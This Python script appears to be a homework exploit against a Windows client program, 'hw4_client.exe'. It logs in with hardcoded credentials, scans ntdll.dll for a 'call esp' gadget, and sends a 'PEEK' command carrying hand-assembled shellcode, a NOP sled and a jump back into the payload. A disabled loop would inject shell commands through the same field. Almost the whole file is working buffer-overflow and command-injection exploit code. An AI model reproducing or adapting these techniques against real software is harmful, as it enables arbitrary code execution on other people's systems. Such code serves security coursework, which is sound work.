import socket
import sys
from sys import argv
import subprocess
from subprocess import PIPE
from time import sleep
import os
import ctypes
import struct
from ctypes import wintypes, windll, POINTER, byref, sizeof, c_char
from ctypes.wintypes import *


class MODULEINFO(ctypes.Structure):
    _fields_ = [
        ("lpBaseOfDll",     wintypes.LPVOID),    # remote pointer
        ("SizeOfImage",     wintypes.DWORD),
        ("EntryPoint",      wintypes.LPVOID),    # remote pointer
    ]


LPMODULEINFO = POINTER(MODULEINFO)


def GetModuleInformation(hProcess, hModule, lpmodinfo=None):
    _GetModuleInformation = windll.psapi.GetModuleInformation
    _GetModuleInformation.argtypes = [HANDLE, HMODULE, LPMODULEINFO, DWORD]
    _GetModuleInformation.restype = bool

    if lpmodinfo is None:
        lpmodinfo = MODULEINFO()
    _GetModuleInformation(hProcess, hModule, byref(
        lpmodinfo), sizeof(lpmodinfo))
    return lpmodinfo


def GetCurrentProcess():
    _GetCurrentProcess = windll.kernel32.GetCurrentProcess
    _GetCurrentProcess.argtypes = []
    _GetCurrentProcess.restype = wintypes.HANDLE
    return _GetCurrentProcess()


def GetMoudleHandle(module):
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    kernel32.GetModuleHandleW.restype = wintypes.HMODULE
    kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
    hMod = kernel32.GetModuleHandleW(module)

    return hMod


def GetGadgetAddress(gadget):
    gadget_len = len(gadget)
    curr_proc = GetCurrentProcess()
    module_handle = GetMoudleHandle('ntdll.dll')
    module_info = GetModuleInformation(curr_proc, module_handle)
    module_size = module_info.SizeOfImage
    moudle_bytes = (c_char * module_size).from_address(module_handle)
    for i in range(module_size-gadget_len):
        if (moudle_bytes[i:i+gadget_len] == gadget):
            return module_handle + i


#proc = subprocess.Popen('./hw4_client.exe', stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
proc = subprocess.Popen(["hw4_client.exe"], stdin=PIPE)
#print(proc.id())
input()

username = "archer\n"
usernameHex = str.encode(username)
proc.stdin.write(usernameHex)
proc.stdin.flush()
password = "S43U0SE6NZ4S46S5\n"
passwordHex = str.encode(password)
proc.stdin.write(passwordHex)
proc.stdin.flush()


callEspHex = "FFD4" #call esp opcode
callEspHexByteArray = bytearray.fromhex(callEspHex)
callEspAdress = GetGadgetAddress(callEspHexByteArray)
#print (callEspAdress)
callEsp = str(hex(callEspAdress))[2:]
address = ''
#print (address)

shellcode = ""
jmptoshell = "E968FDFFFF"
beginingOFShell = ""
beginingOFShell +=  "C7 45 08 63 61 40 00" 										#"mov [ebp+8], "PEEK"
beginingOFShell +="8B 45 0C 89 44 24 04 C7 04 24 68 61 40 00 E8 CA 30 00 00"	# mov eax,DWORD PTR [ebp+0xc]
																				# mov DWORD PTR [esp+0x4],eax
																				# mov DWORD PTR [esp],0x406168
																				# call scanf
beginingOFShell +=  "83 c4 10 " 												#add    esp,16									
beginingOFShell +=	"C7 44 24 10 00 00 00 00 C7 44 24 0C 80 80 40 00"        	#mov 	dword ptr [esp+16], 0
																				#mov    DWORD PTR [esp+0xc],0x408080
beginingOFShell +=	"8D 85 6C DF FF FF 89 44 24 08 8B 45 F0"				 	# lea     eax, [ebp-2094h]
																				#mov    DWORD PTR [esp+0x8],eax
																				#mov    eax,DWORD PTR [ebp-0x10]
beginingOFShell +=	"89 44 24 04 8B 45 08 89 04 24 E8 D6 FA FF FF"				#mov    DWORD PTR [esp+0x4],eax
																				#mov    eax,DWORD PTR [ebp+0x8]
																				# mov    DWORD PTR [esp],eax
																				#call    sub_401892
beginingOFShell	+=	"83 c4 f0  "												# esp ,-16									
beginingOFShell	+= "90"* (4172 - 76)											#	nops


shellcode += beginingOFShell + callEsp + jmptoshell
#print(shellcode)
second_attack = str.encode("PEEK ") + bytearray.fromhex(shellcode) + str.encode("\n")
proc.stdin.write(second_attack)
	

while False:
	try:
		command = input()
	except EOFError:
		continue
	if command == "exit":
		proc.kill()
		break
	proc.stdin.write(str.encode("PEEK \" *;| out-null  " +command +"\n"))
	proc.stdin.flush()

#peek "*; echo msg"




